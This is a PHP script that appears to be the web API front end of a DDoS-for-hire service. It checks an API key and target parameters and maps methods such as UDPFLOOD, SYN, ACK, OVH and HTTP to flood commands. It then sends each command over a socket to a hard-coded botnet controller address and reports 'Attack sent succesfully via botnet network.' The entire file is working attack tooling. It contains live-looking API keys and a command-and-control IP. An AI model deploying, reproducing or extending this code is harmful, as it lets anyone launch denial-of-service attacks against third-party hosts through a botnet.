<?php
	session_start();
	header("Content-type: application/json");
	
	if(time() - @$_SESSION['api_rate_limit'] < 1) {	
		$message = array('status' => 'error', 'message' => "API rate limit is 1 sec.");
		die(json_encode($message, JSON_PRETTY_PRINT));
	}
	else {
		$_SESSION['api_rate_limit'] = time();
	}	
	$API_AllowedKeys = array("hZmq1337kz1mkadlkdsla", "nullinfull#");
	$attackMethods = array(
		"STDHEX", 
		"STD",
		"UDPBYPASS", 
		"UDPFLOOD", 
		"DNS", 
		"HTTP", 
		"OVH", 
		"SYN", 
		"ACK", 
		"HANDSHAKE",
		"RAW",
		"STORM"
	);
	function htmlsc($string)
	{
		return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
	}


	if (!isset($_GET["key"])) {
		$message = array('status' => 'error', 'message' => "Key field is required.");
		die(json_encode($message, JSON_PRETTY_PRINT));
	}	
	
	if (!isset($_GET["host"])) {
		$message = array('status' => 'error', 'message' => "Host field is required.");
		die(json_encode($message, JSON_PRETTY_PRINT));
	}
	if (!isset($_GET["port"])) {
		$message = array('status' => 'error', 'message' => "Port field is required.");
		die(json_encode($message, JSON_PRETTY_PRINT));
	}
	if (!isset($_GET["method"])) {
		$message = array('status' => 'error', 'message' => "Method field is required.");
		die(json_encode($message, JSON_PRETTY_PRINT));
	}
	if (!isset($_GET["time"])) {
		$message = array('status' => 'error', 'message' => "Time field is required.");
		die(json_encode($message, JSON_PRETTY_PRINT));
	}

	$key =       htmlsc($_GET["key"]);
	$host =     htmlsc($_GET["host"]);
	$port =     htmlsc($_GET["port"]);
	$method =     htmlsc(strtoupper($_GET["method"]));
	$time =     htmlsc($_GET["time"]);
	$command = "";

	if (!in_array($key, $API_AllowedKeys)) {
		$message = array('status' => 'error', 'message' => "Invalid API Key.");
		die(json_encode($message, JSON_PRETTY_PRINT));
	}
	if (!in_array($method, $attackMethods))
	{
		$methods_av = array();
		foreach ($attackMethods as $value) {
			array_push($methods_av, array('name' => $value));
		}
		$message = array('status' => 'error', 'message' => "Invalid method.", 'methods' => $methods_av);		
		die(json_encode($message, JSON_PRETTY_PRINT));
	}
	$len = 512;
	if (isset($_GET["len"])) {
		$len = $_GET["len"];
	} 
	switch ($method) {
		case 'STDHEX':
			$command = "!stdhex $host $time port=$port len=$len";
			break;
		case 'STD':
			$command = "!std $host $time port=$port len=$len";
			break;	
		case 'UDPBYPASS':
			$command = "!udpbypass $host $time port=$port len=$len";
			break;
		case 'UDPFLOOD':
			$command = "!udpflood $host $time port=$port len=$len";
			break;
		case 'DNS':
			$command = "!dns $host $time port=$port domain=$host";
			break;  
		case 'HTTP':
			$command = "!http $host $time port=$port domain=$host";
			break;
		case 'OVH':
			$command = "!ovh $host $time port=$port";
			break;
		case 'SYN':
			$command = "!synflood $host $time port=$port";
			break;
		case 'ACK':
			$command = "!ackflood $host $time port=$port len=$len";
			break;
		case 'STOMP':
			$command = "!handshake $host $time port=$port";
			break;
		case 'RAW':
			$command = "!raw $host $time port=$port";
			break;
		case 'STORM':
			$command = "!storm $host $time port=$port";
			break;  
		default:
			$methods_av = array();
			foreach ($attackMethods as $value) {
				array_push($methods_av, array('name' => $value));
			}
			$message = array('status' => 'error', 'message' => "Invalid method.", 'methods' => $methods_av);		
			die(json_encode($message, JSON_PRETTY_PRINT));
			break;
	}
	$socket = fsockopen("156.236.16.237", "44115", $errno, $errstr);
	if (!$socket) {
		$message = array(
			'status' => 'error', 
			'message' => "Invalid connection to botnet network.",
			'errno' => $errno, 
			'errstr' => $errstr
		);
		die(json_encode($message, JSON_PRETTY_PRINT));
	} else {	
		$execution = $key . "|" . $command . "|\r\n";
		sleep(1);		
		if (fwrite($socket, $execution)) {
			$message = array(
				'status' => 'success', 
				'message' => "Attack sent succesfully via botnet network.",
				'len' => $len,
				'host' => $host,
				'port' => $port,
				'time' => $time,
				'method' => $method
			);
			die(json_encode($message, JSON_PRETTY_PRINT));
		} else {
			$message = array('status' => 'error', 'message' => "Can't send attack to botnet network. Try again later.");
			die(json_encode($message, JSON_PRETTY_PRINT));
		}
		sleep(3);
		fclose($socket);
	}
?>